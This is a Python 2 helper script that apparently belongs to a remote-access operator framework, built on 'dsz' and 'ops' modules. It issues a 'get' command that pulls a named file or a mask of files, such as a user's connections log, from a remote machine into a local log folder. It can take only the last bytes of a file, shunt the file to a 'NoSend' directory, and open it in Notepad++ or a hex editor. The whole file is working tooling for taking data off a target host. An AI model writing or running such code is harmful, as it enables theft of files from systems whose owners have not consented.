
import ops, ops.data, ops.cmd
import sys
import dsz
import os
from ops.parseargs import ArgumentParser

def main():
    usage = 'Usage: python windows\\vget.py -args "-F [Full Path to File] -p [path to file] -m [mask] Optional: -t [bytes] -hex -nosend"\n\nOptions:\n-t [bytes] : grab last x bytes of file (tail)\n-nosend : move file to nosend dir\n-hex : open file in hex editor\n\nEx. python windows\\vget.py -args "-m connections.log -p C:\\Documents and Settings\\user\\logs -t 10000 -nosend"\nEx. python windows\\vget.py -args "-F C:\\Documents and Settings\\user\\logs\\connections.log -t 10000 -nosend -hex"'
    parser = ArgumentParser(usage=usage)
    parser.add_argument('-p', dest='path', nargs='+', action='store', default=False)
    parser.add_argument('-m', dest='mask', action='store', default=False)
    parser.add_argument('-F', dest='full_path', nargs='+', action='store', default=False)
    parser.add_argument('-t', dest='tail', type=int, action='store', default=False)
    parser.add_argument('--nosend', dest='nosend', action='store_true', default=False)
    parser.add_argument('--hex', dest='hex', action='store_true', default=False)
    options = parser.parse_args()
    if (len(sys.argv) == 1):
        print usage
        sys.exit(0)
    if (options.full_path == options.mask == False):
        ops.warn('No mask or full path specified! Need one or the other to execute.')
        sys.exit(0)
    mask = options.mask
    tail = options.tail
    nosend = options.nosend
    hex = options.hex
    getCmd = ops.cmd.getDszCommand('get')
    if options.full_path:
        full_path = ' '.join(options.full_path)
        getCmd.arglist.append(('"%s"' % full_path))
    else:
        if options.path:
            path = ' '.join(options.path)
            getCmd.optdict['path'] = ('"%s"' % path)
        getCmd.optdict['mask'] = mask
    if tail:
        getCmd.arglist.append(('-tail %s' % tail))
    getCmd.dszquiet = False
    getCmd.execute()
    getResult = getCmd.result
    id = getResult.cmdid
    for n in getResult.filestop:
        if (n.successful != 1):
            ops.error(('Get Failed; see cmdid %s or above output for more info' % id))
            sys.exit(0)
    localName = ''
    for n in getResult.filelocalname:
        localName = n.localname
    fullLocalPath = os.path.join(dsz.env.Get('_LOGPATH'), 'GetFiles', localName)
    if (nosend == True):
        movePath = os.path.join(dsz.env.Get('_LOGPATH'), 'GetFiles\\NoSend', localName)
        moveCmd = ops.cmd.getDszCommand(('local run -command "cmd.exe /c move %s %s"' % (fullLocalPath, movePath)))
        moveCmd.execute()
        fullLocalPath = movePath
        ops.info(('File moved to %s' % movePath))
    if (hex == False):
        ops.info('Opening file with notepad++')
        showCmd = ops.cmd.getDszCommand(('local run -command "cmd.exe /c C:\\progra~1\\notepad++\\notepad++.exe %s"' % fullLocalPath))
    else:
        ops.info('Opening file with hex editor')
        showCmd = ops.cmd.getDszCommand(('local run -command "cmd.exe /c C:\\Progra~1\\BreakP~1\\HexWor~1.2\\hworks32.exe %s"' % fullLocalPath))
    showCmd.execute()
if (__name__ == '__main__'):
    main()